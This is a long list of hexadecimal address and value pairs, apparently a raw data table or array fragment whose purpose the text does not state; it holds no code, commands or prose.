0x00F09630, 0x00000026, 0x00F0A000, 0x00000064, 0x00F0B6A0, 0x0000001E, 0x00F0D788, 0x00000035, 0x00F12240, 0x0000001C, 0x00F0CE70, 0x00000022, 0x00F0DCB0, 0x0000005E, 0x00F0B9F0, 0x0000004C, 0x00F0C150, 0x00000073, 0x00F10118, 0x00000006, 0x00F0BF10, 0x0000001A, 0x00F0B6F8, 0x00000065, 0x00F11BD8, 0x0000004A, 0x00F10360, 0x00000066, 0x00F10178, 0x0000005C, 0x00F0A710, 0x0000003C, 0x00F0DC78, 0x0000007C, 0x00F11970, 0x0000002E, 0x00F0C148, 0x00000038, 0x00F12C80, 0x00000057, 0x00F0D8D8, 0x00000070, 0x00F0AEF0, 0x00000054, 0x00F11A88, 0x00000070, 0x00F12AC0, 0x00000074, 0x00F09318, 0x00000000, 0x00F0A360, 0x00000005, 0x00F0D210, 0x00000025, 0x00F0B318, 0x0000007E, 0x00F0EB60, 0x0000007A, 0x00F0DE18, 0x00000000, 0x00F0D930, 0x00000037, 0x00F0C7F0, 0x00000034, 0x00F0E390, 0x00000058, 0x00F0F4D8, 0x00000003, 0x00F10890, 0x00000031, 0x00F0D5E0, 0x00000061, 0x00F0B498, 0x0000007C, 0x00F0FE80, 0x0000005B, 0x00F0B0E8, 0x00000074, 0x00F0D388, 0x00000052, 0x00F0CA90, 0x0000001C, 0x00F0D940, 0x00000016, 0x00F0E1A8, 0x00000065, 0x00F12838, 0x0000003C, 0x00F0B268, 0x0000004B, 0x00F0D5C0, 0x00000053, 0x00F09CD0, 0x00000044, 0x00F0D668, 0x00000071, 0x00F0A500, 0x0000002B, 0x00F0B400, 0x00000033, 0x00F0CD48, 0x0000002D, 0x00F0F758, 0x00000018, 0x00F0A640, 0x00000028, 0x00F0B210, 0x0000006B, 0x00F0CB18, 0x0000002B, 0x00F11E40, 0x00000012, 0x00F11740, 0x00000068, 0x00F09678, 0x00000076, 0x00F104E0, 0x00000071, 0x00F091A0, 0x00000076, 0x00F0EFF8, 0x00000057, 0x00F0DCD0, 0x00000065, 0x00F0C9E0, 0x00000039, 0x00F12CB0, 0x00000038, 0x00F0E040, 0x0000004A, 0x00F0DA98, 0x0000004D, 0x00F0ED48, 0x00000037, 0x00F0EBB8, 0x00000067, 0x00F0E9C8, 0x00000045, 0x00F0EBE8, 0x0000005D, 0x00F11490, 0x00000036, 0x00F12068, 0x0000000D, 0x00F091E8, 0x00000076, 0x00F0C708, 0x0000000A, 0x00F10B70, 0x00000047, 0x00F09448, 0x0000002D, 0x00F0F010, 0x00000026, 0x00F0C388, 0x00000065, 0x00F0A118, 0x0000002F, 0x00F09F08, 0x00000073, 0x00F0CB58, 0x00000071, 0x00F0B5E8, 0x0000000B, 0x00F09180, 0x00000045, 0x00F0A230, 0x00000061, 0x00F0BD38, 0x00000010, 0x00F0EAD0, 0x00000031, 0x00F123E0, 0x00000025, 0x00F12038, 0x0000003D, 0x00F10F80, 0x00000033, 0x00F0B930, 0x0000005A, 0x00F0B020, 0x00000054, 0x00F0E7E8, 0x0000000B, 0x00F0D568, 0x00000023, 0x00F09128, 0x0000002A, 0x00F0E000, 0x00000026, 0x00F0D4F0, 0x00000034, 0x00F09480, 0x0000004D, 0x00F0EF38, 0x0000004B, 0x00F11D70, 0x00000033, 0x00F09E90, 0x00000046, 0x00F0E248, 0x00000024, 0x00F0BDF8, 0x00000013, 0x00F0E470, 0x0000005E, 0x00F0B9E0, 0x0000004C, 0x00F0F608, 0x00000000, 0x00F0C0B0, 0x0000001C, 0x00F09EE8, 0x00000062, 0x00F0E610, 0x0000005E, 0x00F0C840, 0x00000021, 0x00F11D70, 0x0000002C, 0x00F0F698, 0x0000000A, 0x00F0B768, 0x00000038, 0x00F093C0, 0x00000067, 0x00F0F938, 0x00000016, 0x00F11820, 0x00000043, 0x00F0D410, 0x00000076, 0x00F09140, 0x0000000D, 0x00F0ABB0, 0x00000050, 0x00F10ED0, 0x00000070, 0x00F0F9B8, 0x0000000B, 0x00F12210, 0x00000018, 0x00F0FE48, 0x0000002B, 0x00F11850, 0x0000002F, 0x00F0A0F8, 0x00000023, 0x00F0E5A0, 0x00000062, 0x00F0C060, 0x00000016, 0x00F11118, 0x0000002C, 0x00F0EBB0, 0x0000005D, 0x00F0E0D8, 0x0000003A, 0x00F0E4F8, 0x0000001B, 0x00F0EC90, 0x00000023, 0x00F0A2B0, 0x00000003, 0x00F0CBD8, 0x0000003E, 0x00F0C728, 0x00000067, 0x00F0EC80, 0x00000072, 0x00F0D4A0, 0x0000006B, 0x00F0D5C0, 0x0000002F, 0x00F0A1F8, 0x0000000B, 0x00F0A810, 0x00000056, 0x00F115E0, 0x00000074, 0x00F0E8C8, 0x00000007, 0x00F09B78, 0x00000032, 0x00F12540, 0x00000048, 0x00F0A488, 0x00000030, 0x00F09580, 0x00000027, 0x00F0D630, 0x0000002F, 0x00F09A38, 0x00000064, 0x00F0BF70, 0x0000001F, 0x00F0B3D8, 0x0000000D, 0x00F0F0B0, 0x00000077, 0x00F0D9C0, 0x00000020, 0x00F0E4C0, 0x0000000E, 0x00F0E7F0, 0x00000051, 0x00F10900, 0x00000064, 0x00F0B0B0, 0x00000064, 0x00F0A7C8, 0x00000020, 0x00F0A330, 0x00000021, 0x00F0BB38, 0x00000078, 0x00F10318, 0x0000007C, 0x00F09BF0, 0x00000065, 0x00F0EB78, 0x0000006E, 0x00F0BD98, 0x00000054, 0x00F122A0, 0x00000009, 0x00F12A90, 0x00000026, 0x00F0EEC0, 0x0000003C, 0x00F0A340, 0x0000004A, 0x00F0A5C8, 0x00000010, 0x00F0F5C8, 0x0000003A, 0x00F12090, 0x0000007C, 0x00F0ECA8, 0x00000010, 0x00F09A30, 0x00000045, 0x00F0AE70, 0x00000013, 0x00F0F220, 0x00000021, 0x00F0D7A8, 0x00000004, 0x00F12620, 0x00000057, 0x00F11CE8, 0x00000055, 0x00F0F6D0, 0x00000045, 0x00F0D3C0, 0x00000033, 0x00F0DFC0, 0x0000006E, 0x00F0E9D0, 0x0000001C, 0x00F0EF08, 0x00000073, 0x00F0C698, 0x00000054, 0x00F0A718, 0x00000040, 0x00F0AA40, 0x0000005C, 0x00F0B0E0, 0x00000013, 0x00F09720, 0x00000005, 0x00F11448, 0x00000053, 0x00F09458, 0x00000068, 0x00F0F450, 0x00000064, 0x00F10138, 0x0000001E, 0x00F0AB90, 0x00000049, 0x00F12178, 0x00000001, 0x00F0A230, 0x0000003F, 0x00F0C7A0, 0x00000019, 0x00F11320, 0x00000063, 0x00F0BF30, 0x00000030, 0x00F0ED30, 0x00000047, 0x00F0A4B8, 0x00000028, 0x00F0ECF8, 0x00000019, 0x00F0F9A8, 0x00000010, 0x00F0FAE8, 0x0000005F, 0x00F09A70, 0x00000068, 0x00F12AB8, 0x0000004B, 0x00F129C0, 0x0000005E, 0x00F0E508, 0x00000035, 0x00F11578, 0x00000031, 0x00F0B630, 0x0000002B, 0x00F0B2D0, 0x00000018, 0x00F11670, 0x0000006A, 0x00F0BCF8, 0x0000007E, 0x00F0AD40, 0x0000001C, 0x00F0ECF0, 0x00000034, 0x00F0E188, 0x0000002E, 0x00F0E3A0, 0x0000000D, 0x00F0C4A8, 0x00000064, 0x00F10FC8, 0x0000000E, 0x00F108A8, 0x00000018, 0x00F0B960, 0x00000007, 0x00F0A590, 0x0000005A, 0x00F0FB28, 0x0000005F, 0x00F0BF48, 0x0000003B, 0x00F0F3D8, 0x00000051, 0x00F0E900, 0x0000003E, 0x00F10AF8, 0x00000067, 0x00F0FFF8, 0x00000006, 0x00F0BF08, 0x00000002, 0x00F09358, 0x00000034, 0x00F0CB90, 0x00000025, 0x00F0B8F8, 0x00000009, 0x00F09C50, 0x0000006A, 0x00F12A60, 0x0000005D, 0x00F0D110, 0x0000003D, 0x00F0A758, 0x00000054, 0x00F0C960, 0x00000053, 0x00F09480, 0x0000000E, 0x00F0B890, 0x0000007B, 0x00F0B888, 0x0000000D, 0x00F0D468, 0x00000041, 0x00F0C130, 0x00000031, 0x00F10F78, 0x0000006D, 0x00F0D4E0, 0x00000008, 0x00F0B350, 0x0000006D, 0x00F0D7E8, 0x0000002F, 0x00F10890, 0x0000002A, 0x00F0ABD8, 0x00000021, 0x00F09A48, 0x00000054, 0x00F0B8A8, 0x0000001D, 0x00F0FC50, 0x00000030, 0x00F0C0C0, 0x00000019, 0x00F0E7C0, 0x00000069, 0x00F0FF88, 0x0000005E, 0x00F0D7F8, 0x0000006A, 0x00F0FB10, 0x00000028, 0x00F101D8, 0x00000062, 0x00F11498, 0x00000012, 0x00F0E740, 0x0000004B, 0x00F0BA18, 0x0000001A, 0x00F09BD0, 0x0000002D, 0x00F121F8, 0x0000007B, 0x00F0BAB8, 0x0000000C, 0x00F09098, 0x00000028, 0x00F0ED48, 0x00000001, 0x00F0ABB8, 0x0000002D, 0x00F0A8B8, 0x0000001D, 0x00F0A458, 0x00000051, 0x00F0B8F8, 0x0000000B, 0x00F0D630, 0x0000002A, 0x00F12B68, 0x0000000F, 0x00F10998, 0x0000006F, 0x00F09078, 0x00000043, 0x00F0BE68, 0x0000005B, 0x00F0C520, 0x00000049, 0x00F11FE8, 0x0000005C, 0x00F0BA50, 0x0000005B, 0x00F0D148, 0x0000006C, 0x00F10B78, 0x00000043, 0x00F12538, 0x00000036, 0x00F0A0D0, 0x00000054, 0x00F0D0D8, 0x00000079, 0x00F0A9D8, 0x0000005D, 0x00F0DFA8, 0x00000050, 0x00F10B40, 0x00000025, 0x00F09570, 0x0000003C, 0x00F115D0, 0x0000006F, 0x00F11960, 0x00000034, 0x00F0D280, 0x00000019, 0x00F11A28, 0x0000006F, 0x00F0D410, 0x0000005F, 0x00F12208, 0x00000054, 0x00F0FC00, 0x00000038, 0x00F0BF90, 0x0000003A, 0x00F0CFD8, 0x00000068, 0x00F0BC40, 0x0000004E, 0x00F0DCE0, 0x00000055, 0x00F11540, 0x00000057, 0x00F0C7E8, 0x0000007C, 0x00F123A8, 0x0000004E, 0x00F0A528, 0x0000004D, 0x00F0FBD0, 0x00000044, 0x00F0C3C0, 0x0000003D, 0x00F096B8, 0x0000002A, 0x00F0AB28, 0x0000005A, 0x00F0BF88, 0x0000001A, 0x00F12688, 0x00000024, 0x00F12AF8, 0x00000073, 0x00F12BE8, 0x00000029, 0x00F0D258, 0x0000000F, 0x00F0EFA0, 0x00000045, 0x00F09970, 0x00000055, 0x00F0F6C0, 0x0000003A, 0x00F09378, 0x0000000A, 0x00F0C368, 0x00000028, 0x00F09E20, 0x00000072, 0x00F0D0E8, 0x0000003B, 0x00F0ABD0, 0x00000057, 0x00F09FA8, 0x00000051, 0x00F11E90, 0x0000006A, 0x00F12B00, 0x00000045, 0x00F0FFE8, 0x0000000B, 0x00F0C3D8, 0x0000005A, 0x00F0ED08, 0x0000000E, 0x00F0F588, 0x0000003D, 0x00F09460, 0x00000072, 0x00F0BBC0, 0x00000041, 0x00F0CD80, 0x00000022, 0x00F0ACE0, 0x00000056, 0x00F0C200, 0x00000031, 0x00F0BF10, 0x00000036, 0x00F0BE50, 0x00000044, 0x00F10600, 0x00000054, 0x00F0E9A8, 0x00000076, 0x00F0A518, 0x0000002A, 0x00F09928, 0x0000007E, 0x00F0BE80, 0x0000004F, 0x00F0E468, 0x0000005D, 0x00F0C5F8, 0x0000006F, 0x00F0AB60, 0x00000065, 0x00F0D4E8, 0x0000002F, 0x00F0D820, 0x00000059, 0x00F09488, 0x00000072, 0x00F0C1B8, 0x00000069, 0x00F10910, 0x00000030, 0x00F0A4D0, 0x0000005E, 0x00F0E6B0, 0x00000025, 0x00F0BCF0, 0x00000039, 0x00F0CEB0, 0x00000023, 0x00F0EE60, 0x0000000D, 0x00F10D80, 0x00000072, 0x00F12948, 0x00000052, 0x00F0D0A8, 0x00000035, 0x00F0A0D8, 0x00000012, 0x00F12AE8, 0x00000072, 0x00F0BF98, 0x00000020, 0x00F09AF8, 0x00000059, 0x00F0CC18, 0x00000021, 0x00F0C1B0, 0x00000017, 0x00F0C6D0, 0x0000004F, 0x00F0EBC0, 0x0000006F, 0x00F0A928, 0x00000007, 0x00F0D580, 0x0000001A, 0x00F0A988, 0x0000002C, 0x00F09938, 0x0000005D, 0x00F0F4F0, 0x00000068, 0x00F09FF0, 0x0000007A, 0x00F0B170, 0x00000039, 0x00F0D578, 0x00000072, 0x00F0C330, 0x00000017, 0x00F106E8, 0x0000001E, 0x00F0BA20, 0x0000004B, 0x00F0C7C8, 0x00000048, 0x00F0D5D0, 0x0000000F, 0x00F0D638, 0x00000012, 0x00F12250, 0x00000059, 0x00F0D740, 0x00000066, 0x00F0D0D8, 0x0000000A, 0x00F12280, 0x00000067, 0x00F0A9D0, 0x00000060, 0x00F0F758, 0x0000005D, 0x00F0CCE0, 0x00000040, 0x00F0F3E0, 0x0000003A, 0x00F0C220, 0x00000073, 0x00F0CE70, 0x0000002F, 0x00F0F5F8, 0x00000039, 0x00F0C338, 0x00000059, 0x00F123B8, 0x00000060, 0x00F0B590, 0x0000002B, 0x00F0BA48, 0x0000004A, 0x00F09258, 0x0000006E, 0x00F0D5F0, 0x0000007B, 0x00F0F940, 0x0000000E, 0x00F0C588, 0x0000002C, 0x00F09BB0, 0x00000001, 0x00F0B6D0, 0x00000000, 0x00F0FE90, 0x00000064, 0x00F0C0B8, 0x00000035, 0x00F0F5D0, 0x00000055, 0x00F09A80, 0x00000025, 0x00F0E098, 0x00000038, 0x00F103B0, 0x00000036, 0x00F10718, 0x00000029, 0x00F0FBA8, 0x0000003F, 0x00F0B348, 0x00000056, 0x00F11EF8, 0x0000006A, 0x00F0E720, 0x00000064, 0x00F0BDB8, 0x0000000D, 0x00F0C110, 0x00000007, 0x00F10ED0, 0x0000001C, 0x00F0CED8, 0x00000004, 0x00F09A00, 0x0000001C, 0x00F0A860, 0x00000066, 0x00F0D510, 0x00000050, 0x00F0B240, 0x0000000F, 0x00F12478, 0x00000057, 0x00F0DC60, 0x00000005, 0x00F0A1D0, 0x0000002E, 0x00F128C8, 0x00000044, 0x00F0B430, 0x0000002C, 0x00F0CC40, 0x0000004C, 0x00F0D068, 0x0000006B, 0x00F10D48, 0x0000004F, 0x00F0B7A8, 0x0000004F, 0x00F0B6E8, 0x0000001A, 0x00F0C520, 0x0000006E, 0x00F0F528, 0x0000003A, 0x00F128A8, 0x00000033, 0x00F0F3D0, 0x0000006C, 0x00F09758, 0x00000001, 0x00F0CA30, 0x0000005B, 0x00F09130, 0x00000005, 0x00F0A510, 0x0000002F, 0x00F102A0, 0x0000002A, 0x00F0ABD0, 0x00000002, 0x00F10AC8, 0x00000056, 0x00F0C7F0, 0x00000034, 0x00F0B410, 0x00000031, 0x00F0C150, 0x00000034, 0x00F0ECF8, 0x0000006C, 0x00F0B548, 0x0000003E, 0x00F0F5B8, 0x00000023, 0x00F0DC68, 0x00000012, 0x00F0DD40, 0x00000028, 0x00F0C750, 0x00000038, 0x00F0CD38, 0x0000001E, 0x00F0C2A0, 0x00000050, 0x00F0E168, 0x00000008, 0x00F112A8, 0x00000000, 0x00F0E318, 0x00000020, 0x00F115A0, 0x00000065, 0x00F0DCF8, 0x00000055, 0x00F11CD8, 0x0000005B, 0x00F0B878, 0x00000006, 0x00F0AAB8, 0x0000003D, 0x00F0DF68, 0x00000076, 0x00F0CDA8, 0x00000008, 0x00F0A2A0, 0x00000020, 0x00F11BD8, 0x0000001E, 0x00F0DDD0, 0x00000043, 0x00F0F0E8, 0x00000069, 0x00F0F378, 0x00000069, 0x00F0FAD0, 0x00000031, 0x00F0ECA8, 0x00000025, 0x00F0E4B0, 0x00000062, 0x00F0D380, 0x00000067, 0x00F09100, 0x0000001D, 0x00F12838, 0x0000002B, 0x00F0B478, 0x0000003B, 0x00F12120, 0x0000005A, 0x00F0C5D8, 0x00000041, 0x00F0F840, 0x00000062, 0x00F0DE98, 0x0000003A, 0x00F11918, 0x00000032, 0x00F0A340, 0x00000022, 0x00F0C6D8, 0x0000003B, 0x00F0F760, 0x0000004F, 0x00F0A6D0, 0x0000000A, 0x00F11D40, 0x00000066, 0x00F0D928, 0x0000000A, 0x00F0D2D8, 0x0000006D, 0x00F0B2D0, 0x00000044, 0x00F0B838, 0x00000075, 0x00F10A10, 0x0000003A, 0x00F0C710, 0x00000072, 0x00F129C0, 0x0000001C, 0x00F12C30, 0x0000003A, 0x00F0B380, 0x00000015, 0x00F0C890, 0x0000003D, 0x00F0B918, 0x00000010, 0x00F11150, 0x00000001, 0x00F10B90, 0x00000027, 0x00F0DB68, 0x0000005C, 0x00F0DC88, 0x00000011, 0x00F101B0, 0x00000000, 0x00F0B130, 0x0000004B, 0x00F0D930, 0x0000005E, 0x00F0B510, 0x0000005C, 0x00F09BF8, 0x0000006E, 0x00F0DE00, 0x00000055, 0x00F0EF20, 0x0000004A, 0x00F0CA58, 0x0000007C, 0x00F0E838, 0x0000004E, 0x00F0BA68, 0x00000057, 0x00F11B18, 0x00000024, 0x00F0B968, 0x00000059, 0x00F124D8, 0x0000004B, 0x00F0EC40, 0x0000000C, 0x00F09FD0, 0x0000002B, 0x00F11AD8, 0x00000074, 0x00F103A8, 0x00000034, 0x00F0CA40, 0x00000068, 0x00F127E8, 0x0000001C, 0x00F0B380, 0x00000044, 0x00F12AD0, 0x00000028, 0x00F09DC0, 0x00000030, 0x00F0A4E8, 0x00000031, 0x00F0A670, 0x0000002C, 0x00F11AA0, 0x0000004D, 0x00F0B830, 0x00000057, 0x00F0A3A0, 0x0000002A, 0x00F09C00, 0x00000011, 0x00F0ABC8, 0x00000037, 0x00F090A0, 0x00000056, 0x00F0E590, 0x00000000, 0x00F0C248, 0x00000016, 0x00F12058, 0x00000066, 0x00F0D250, 0x00000043, 0x00F0FE90, 0x00000031, 0x00F0CB98, 0x00000079, 0x00F0DD30, 0x0000006B, 0x00F0D410, 0x0000006D, 0x00F0E0E8, 0x0000003E, 0x00F09F88, 0x00000002, 0x00F0A730, 0x00000025, 0x00F0B418, 0x0000002F, 0x00F0F930, 0x0000002E, 0x00F0AFE8, 0x00000026, 0x00F0B5B0, 0x00000022, 0x00F0F738, 0x00000058, 0x00F127E0, 0x00000045, 0x00F12818, 0x0000003D, 0x00F0D548, 0x0000001E, 0x00F11928, 0x0000002B, 0x00F09160, 0x00000056, 0x00F11698, 0x00000058, 0x00F0B668, 0x00000030, 0x00F0D8B8, 0x00000012, 0x00F0D9A0, 0x00000032, 0x00F10D98, 0x00000038, 0x00F0FF18, 0x00000078, 0x00F0EFE8, 0x00000063, 0x00F0ED48, 0x0000003A, 0x00F0B718, 0x00000072, 0x00F0DF88, 0x00000013, 0x00F0A240, 0x0000004B, 0x00F0F4D0, 0x00000010, 0x00F0A380, 0x0000001D, 0x00F0D0C0, 0x0000000D, 0x00F0F080, 0x00000052, 0x00F11A18, 0x00000067, 0x00F0B988, 0x0000002C, 0x00F0E370, 0x0000000B, 0x00F09478, 0x0000000D, 0x00F0A998, 0x00000073, 0x00F0D9A8, 0x00000073, 0x00F10A28, 0x00000009, 0x00F105E0, 0x00000059, 0x00F0AD68, 0x00000001, 0x00F09398, 0x0000002E, 0x00F0ADD0, 0x00000039, 0x00F0E100, 0x00000054, 0x00F0CF18, 0x0000001C, 0x00F0DA80, 0x00000047, 0x00F0FB70, 0x0000000A, 0x00F0D760, 0x00000059, 0x00F0B678, 0x00000068, 0x00F0A9E8, 0x0000002B, 0x00F096C8, 0x00000042, 0x00F0C6C8, 0x00000036, 0x00F09F80, 0x00000012, 0x00F0E170, 0x0000003F, 0x00F12690, 0x00000042, 0x00F095B8, 0x00000063, 0x00F10558, 0x0000005A, 0x00F09DE8, 0x00000004, 0x00F0D5C0, 0x0000006B, 0x00F0BB78, 0x0000007D, 0x00F09F38, 0x0000004C, 0x00F0BAE8, 0x00000040, 0x00F09A28, 0x00000016, 0x00F10C88, 0x00000043, 0x00F10B78, 0x00000009, 0x00F0E8F8, 0x0000006B, 0x00F104F0, 0x0000003E, 0x00F0FC30, 0x0000004A, 0x00F0A4E0, 0x00000045, 0x00F0EA38, 0x00000011, 0x00F0A760, 0x0000003C, 0x00F0B230, 0x00000039, 0x00F0A848, 0x00000049, 0x00F0B240, 0x0000007D, 0x00F0AAE8, 0x00000068, 0x00F0C7A8, 0x00000039, 0x00F0FCB0, 0x0000002A, 0x00F0D0A0, 0x00000071, 0x00F09D20, 0x0000005A, 0x00F0D0B0, 0x00000000, 0x00F0F8A8, 0x00000021, 0x00F11D28, 0x0000006F, 0x00F09320, 0x00000013, 0x00F10C70, 0x00000074, 0x00F10C80, 0x0000006E, 0x00F0D940, 0x00000044, 0x00F0E188, 0x0000002F, 0x00F0E498, 0x0000007D, 0x00F0CD48, 0x00000075, 0x00F0BC20, 0x00000016, 0x00F0A0C0, 0x00000013, 0x00F09340, 0x00000063, 0x00F102C0, 0x0000006C, 0x00F0F680, 0x00000027, 0x00F0A390, 0x00000028, 0x00F11D58, 0x0000005F, 0x00F0EE88, 0x00000029, 0x00F0FC50, 0x00000022, 0x00F0D068, 0x00000079, 0x00F109C0, 0x00000040, 0x00F0F298, 0x00000011, 0x00F0B3C0, 0x0000001A, 0x00F0F718, 0x00000002, 0x00F0BBA0, 0x00000039, 0x00F0D888, 0x00000034, 0x00F11D98, 0x0000002A, 0x00F0BBC8, 0x00000000, 0x00F0FAD0, 0x0000003F, 0x00F117E8, 0x0000006E, 0x00F0BFF0, 0x0000001C, 0x00F11648, 0x00000075, 0x00F0E7C8, 0x00000023, 0x00F12A88, 0x00000049, 0x00F0F860, 0x00000055, 0x00F0E3C8, 0x00000058, 0x00F0B560, 0x00000027, 0x00F11520, 0x00000061, 0x00F09F00, 0x00000043, 0x00F12A08, 0x00000042, 0x00F0E288, 0x0000005D, 0x00F09798, 0x00000079, 0x00F09490, 0x0000007C, 0x00F0A240, 0x00000060, 0x00F0CC58, 0x00000077, 0x00F0C2A8, 0x00000033, 0x00F09E48, 0x0000006C, 0x00F0C740, 0x00000065, 0x00F0DE00, 0x0000006D, 0x00F0F970, 0x0000004E, 0x00F0C158, 0x00000043, 0x00F0F2B0, 0x00000035, 0x00F0FDD8, 0x00000007, 0x00F0A528, 0x00000034, 0x00F0E038, 0x00000052, 0x00F0F6D8, 0x00000074, 0x00F0CB08, 0x00000041, 0x00F0BBF0, 0x0000006D, 0x00F0FBA0, 0x0000003C, 0x00F0C3E8, 0x00000055, 0x00F0CDD0, 0x00000021, 0x00F0C400, 0x00000063, 0x00F0AAB8, 0x00000027, 0x00F0E0F8, 0x0000003E, 0x00F10678, 0x0000004C, 0x00F0F340, 0x00000030, 0x00F0B2C8, 0x0000000D, 0x00F11AE8, 0x00000045, 0x00F0BCA8, 0x00000028, 0x00F0CBE8, 0x0000000A, 0x00F0A430, 0x00000042, 0x00F0FA08, 0x00000003, 0x00F11D90, 0x00000027, 0x00F0E210, 0x00000054, 0x00F0A3B8, 0x00000004, 0x00F09608, 0x00000027, 0x00F11DC0, 0x00000035, 0x00F0B738, 0x00000057, 0x00F0E980, 0x00000037, 0x00F12C30, 0x00000073, 0x00F0D0F8, 0x00000035, 0x00F0E0B8, 0x0000000A, 0x00F11318, 0x0000003F, 0x00F0B4B0, 0x00000060, 0x00F10F88, 0x00000038, 0x00F0DFD8, 0x0000000A, 0x00F0B5E0, 0x00000075, 0x00F12C18, 0x00000063, 0x00F09CA8, 0x0000003B, 0x00F097B0, 0x00000021, 0x00F10B18, 0x0000004C, 0x00F0E2D0, 0x00000040, 0x00F0A7A8, 0x00000015, 0x00F0E680, 0x00000007, 0x00F0E2B0, 0x00000073, 0x00F0CDA8, 0x0000001B, 0x00F12038, 0x00000005, 0x00F0D260, 0x00000023, 0x00F0A920, 0x00000048, 0x00F0D488, 0x0000000F, 0x00F0B980, 0x0000004C, 0x00F11B88, 0x00000002, 0x00F0D890, 0x0000003C, 0x00F0AF48, 0x00000072, 0x00F12720, 0x00000009, 0x00F0C6A0, 0x00000070, 0x00F0C2C8, 0x0000007D, 0x00F0EE88, 0x00000039, 0x00F0BCC0, 0x00000010, 0x00F0BC20, 0x00000019, 0x00F12030, 0x0000001F, 0x00F12120, 0x00000075, 0x00F0B140, 0x00000000, 0x00F0EB68, 0x00000066, 0x00F0DD48, 0x00000004, 0x00F0F838, 0x00000074, 0x00F0E348, 0x00000067, 0x00F0A470, 0x0000006E, 0x00F098F8, 0x00000048, 0x00F11FD8, 0x00000006, 0x00F12640, 0x0000000C, 0x00F0CB98, 0x0000007E, 0x00F0ECC8, 0x00000064, 0x00F0B638, 0x00000053, 0x00F11408, 0x00000054, 0x00F0DCE0, 0x00000055, 0x00F11390, 0x00000062, 0x00F0D498, 0x0000006E, 0x00F0B790, 0x00000055, 0x00F10B60, 0x0000006B, 0x00F0B668, 0x00000037, 0x00F0CAB0, 0x00000067, 0x00F11B68, 0x0000006E, 0x00F0CD50, 0x00000069, 0x00F0CBA0, 0x00000037, 0x00F0D2C8, 0x00000016, 0x00F11288, 0x00000026, 0x00F0C318, 0x00000039, 0x00F0B090, 0x0000003B, 0x00F0BA90, 0x00000070, 0x00F0CDC8, 0x00000002, 0x00F10D70, 0x00000032, 0x00F0A4D0, 0x0000004D, 0x00F112D0, 0x00000014, 0x00F11220, 0x00000018, 0x00F0CDF8, 0x0000006E, 0x00F0A470, 0x00000006, 0x00F0C080, 0x00000062, 0x00F09F58, 0x00000032, 0x00F11628, 0x0000003D, 0x00F0F788, 0x0000000B, 0x00F0CC20, 0x0000004C, 0x00F0DE78, 0x00000022, 0x00F0BAE0, 0x0000002F, 0x00F0D3E8, 0x0000001B, 0x00F092A0, 0x00000022, 0x00F12A40, 0x0000001A, 0x00F099E0, 0x0000004A, 0x00F103B0, 0x00000054, 0x00F12A10, 0x0000001D, 0x00F10930, 0x00000044, 0x00F0D480, 0x00000057, 0x00F0E0E0, 0x00000007, 0x00F0EFD8, 0x00000009, 0x00F12320, 0x00000067, 0x00F111B8, 0x0000005B, 0x00F10968, 0x00000077, 0x00F0CC30, 0x00000073, 0x00F0B708, 0x0000002A, 0x00F129F0, 0x0000001C, 0x00F10408, 0x0000000C, 0x00F11998, 0x0000001D, 0x00F0DCA8, 0x00000004, 0x00F0EAA8, 0x0000005F, 0x00F0D9E8, 0x0000005B, 0x00F095C8, 0x0000006E, 0x00F0BBD0, 0x00000042, 0x00F0CF68, 0x00000032, 0x00F0E340, 0x00000035, 0x00F10008, 0x00000022, 0x00F0EBC0, 0x0000002E, 0x00F0AB48, 0x00000056, 0x00F0B788, 0x0000007B, 0x00F09BE0, 0x00000001, 0x00F103B8, 0x0000005F, 0x00F10B10, 0x00000061, 0x00F10E38, 0x0000007B, 0x00F0B208, 0x00000040, 0x00F0C908, 0x00000019, 0x00F0B380, 0x00000061, 0x00F0A478, 0x0000006A, 0x00F0CD90, 0x0000000E, 0x00F0A4E8, 0x0000005D, 0x00F0C7C0, 0x00000033, 0x00F11450, 0x0000006D, 0x00F11C08, 0x00000023, 0x00F0A3F0, 0x0000000F, 0x00F0C2C8, 0x00000071, 0x00F0CAE0, 0x00000027, 0x00F0C758, 0x0000000E, 0x00F0F910, 0x0000003E, 0x00F0E9F0, 0x00000009, 0x00F0DFB0, 0x00000041, 0x00F109A8, 0x00000015, 0x00F0D560, 0x00000010, 0x00F12BF8, 0x00000061, 0x00F121E8, 0x0000006F, 0x00F0B300, 0x0000002D, 0x00F12390, 0x0000004A, 0x00F0A440, 0x0000003A, 0x00F12B88, 0x0000007E, 0x00F0FFD0, 0x00000026, 0x00F0FBF8, 0x00000076, 0x00F11280, 0x00000014, 0x00F0F3F8, 0x00000059, 0x00F099E8, 0x00000062, 0x00F0B310, 0x00000030, 0x00F11F58, 0x00000041, 0x00F0CB78, 0x0000001A, 0x00F097B0, 0x00000045, 0x00F0ED28, 0x0000000E, 0x00F0D6C8, 0x0000001B, 0x00F09E38, 0x00000043, 0x00F0C2F8, 0x00000024, 0x00F0C778, 0x00000026, 0x00F0C868, 0x0000004D, 0x00F0A9F0, 0x00000018, 0x00F0EB30, 0x0000006B, 0x00F109D0, 0x0000005A, 0x00F0CFE0, 0x0000004D, 0x00F0F288, 0x0000001F, 0x00F0E2E0, 0x0000006C, 0x00F0DEB0, 0x00000009, 0x00F10290, 0x00000067, 0x00F0B910, 0x0000002D, 0x00F0C830, 0x0000002B, 0x00F0DFE0, 0x0000001D, 0x00F0BA70, 0x00000070, 0x00F10AA0, 0x00000026, 0x00F10FB8, 0x00000072, 0x00F12260, 0x00000077, 0x00F11EF8, 0x00000016, 0x00F10540, 0x00000056, 0x00F0BFA0, 0x00000061, 0x00F12180, 0x00000021, 0x00F118A0, 0x00000052, 0x00F0C7D8, 0x00000069, 0x00F12070, 0x0000003C, 0x00F0D470, 0x0000007C, 0x00F0BB48, 0x0000007B, 0x00F0F5B0, 0x00000005, 0x00F0C360, 0x00000044, 0x00F0D910, 0x0000002F, 0x00F0A6F0, 0x0000006F, 0x00F09CA8, 0x00000001, 0x00F0DFF8, 0x00000042, 0x00F0AD90, 0x0000002A, 0x00F10930, 0x0000006D, 0x00F0C600, 0x00000039, 0x00F0D1A0, 0x00000018, 0x00F09900, 0x0000004A, 0x00F10B40, 0x00000006, 0x00F0B968, 0x00000017, 0x00F0FE28, 0x0000000F, 0x00F0F5E0, 0x00000032, 0x00F0A850, 0x00000025, 0x00F0B620, 0x0000001C, 0x00F0E240, 0x00000037, 0x00F0E838, 0x00000023, 0x00F0C4C8, 0x0000004A, 0x00F0E948, 0x00000020, 0x00F125F0, 0x00000062, 0x00F0E448, 0x00000012, 0x00F122D0, 0x00000051, 0x00F0AF28, 0x0000002C, 0x00F0C0F0, 0x0000004A, 0x00F0E658, 0x00000047, 0x00F0DD60, 0x0000006F, 